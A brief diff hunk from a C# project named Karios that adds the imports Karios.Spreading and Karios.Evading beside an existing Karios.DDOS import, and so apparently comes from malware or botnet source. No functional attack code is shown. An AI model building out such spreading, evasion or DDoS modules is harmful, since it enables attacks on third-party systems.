@@ -10,6 +10,8 @@ using System.Net.Mail;
 using System.Drawing;
 using System.Net.NetworkInformation;
 using Karios.DDOS;
+using Karios.Spreading;
+using Karios.Evading;
 
 namespace Karios
 {
